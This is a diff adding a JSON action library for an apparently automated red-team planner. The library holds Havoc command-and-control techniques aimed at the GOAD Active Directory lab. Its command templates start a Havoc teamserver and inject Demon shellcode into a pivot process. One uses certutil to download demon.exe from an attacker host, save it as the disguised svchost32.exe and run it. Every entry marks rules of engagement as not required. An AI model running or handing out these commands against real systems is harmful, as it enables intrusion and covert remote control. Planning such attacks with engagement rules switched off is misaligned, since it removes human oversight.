@@ -1,0 +1,106 @@
+[
+  {
+    "uuid": "goad-c2-t1071001-havoc-https-0",
+    "name": "havoc_https_listener",
+    "mitre_technique": "T1071.001",
+    "mitre_tactic": "TA0011",
+    "description": "Deploy Havoc teamserver with HTTPS listener (Teams User-Agent). Demon beacons back over port 443.",
+    "source": "HavocFramework/Havoc",
+    "command_template": "sudo ./havoc server --profile ./profiles/havoc.yaotl -v 2>/dev/null & sleep 3 && echo '[+] Havoc HTTPS listener on {teamserver_host}:443'",
+    "preconditions": {
+      "executor": "bash",
+      "privilege": "admin",
+      "required_services": [],
+      "required_files": ["./profiles/havoc.yaotl", "./havoc"],
+      "required_credentials": [],
+      "required_access": "network",
+      "additional": ["havoc_built", "port_443_open"]
+    },
+    "effects": {
+      "grants_access": "c2_channel",
+      "creates_artifact": "https_listener"
+    },
+    "cost": 0.40,
+    "rules_of_engagement_required": false,
+    "enrichment_quality": "stars-imported",
+    "provenance": {"tool": "github-stars", "report": "jf-stars-2026", "confidence": 0.85}
+  },
+  {
+    "uuid": "goad-c2-t1090001-havoc-smb-0",
+    "name": "havoc_smb_pivot",
+    "mitre_technique": "T1090.001",
+    "mitre_tactic": "TA0011",
+    "description": "Havoc SMB named pipe pivot: chain C2 through an internal Windows host with no direct internet. Inject Demon SMB shellcode into pivot PID.",
+    "source": "HavocFramework/Havoc",
+    "command_template": "shellcode inject x64 {pivot_pid} {demon_smb_payload_path}",
+    "preconditions": {
+      "executor": "cmd",
+      "privilege": "admin",
+      "required_services": ["smb"],
+      "required_files": ["{demon_smb_payload_path}"],
+      "required_credentials": [],
+      "required_access": "network",
+      "additional": ["active_havoc_session", "smb_listener_configured"]
+    },
+    "effects": {
+      "grants_access": "c2_channel",
+      "creates_artifact": "smb_pivot_session"
+    },
+    "cost": 0.50,
+    "rules_of_engagement_required": false,
+    "enrichment_quality": "stars-imported",
+    "provenance": {"tool": "github-stars", "report": "jf-stars-2026", "confidence": 0.80}
+  },
+  {
+    "uuid": "goad-c2-t1573001-havoc-encrypted-0",
+    "name": "havoc_encrypted_channel",
+    "mitre_technique": "T1573.001",
+    "mitre_tactic": "TA0011",
+    "description": "Havoc Demon uses AES-256 encrypted C2 traffic — verify active session via checkin command.",
+    "source": "HavocFramework/Havoc",
+    "command_template": "checkin",
+    "preconditions": {
+      "executor": "cmd",
+      "privilege": "user",
+      "required_services": [],
+      "required_files": [],
+      "required_credentials": [],
+      "required_access": "network",
+      "additional": ["active_havoc_session"]
+    },
+    "effects": {
+      "grants_access": "c2_channel",
+      "creates_artifact": "encrypted_beacon"
+    },
+    "cost": 0.20,
+    "rules_of_engagement_required": false,
+    "enrichment_quality": "stars-imported",
+    "provenance": {"tool": "github-stars", "report": "jf-stars-2026", "confidence": 0.88}
+  },
+  {
+    "uuid": "goad-c2-t1105-havoc-demon-drop-0",
+    "name": "havoc_demon_drop",
+    "mitre_technique": "T1105",
+    "mitre_tactic": "TA0011",
+    "description": "Transfer compiled Havoc Demon EXE to GOAD target via certutil, then execute to establish C2 session.",
+    "source": "HavocFramework/Havoc",
+    "command_template": "certutil.exe -urlcache -split -f http://{attacker_ip}:{c2_port}/demon.exe C:\\Windows\\Temp\\svchost32.exe && C:\\Windows\\Temp\\svchost32.exe",
+    "preconditions": {
+      "executor": "cmd",
+      "privilege": "user",
+      "required_services": [],
+      "required_files": [],
+      "required_credentials": [],
+      "required_access": "network",
+      "additional": ["demon_exe_hosted", "outbound_http_allowed"]
+    },
+    "effects": {
+      "grants_access": "c2_channel",
+      "creates_artifact": "demon_agent_process"
+    },
+    "cost": 0.35,
+    "rules_of_engagement_required": false,
+    "enrichment_quality": "stars-imported",
+    "provenance": {"tool": "github-stars", "report": "jf-stars-2026", "confidence": 0.90}
+  }
+]
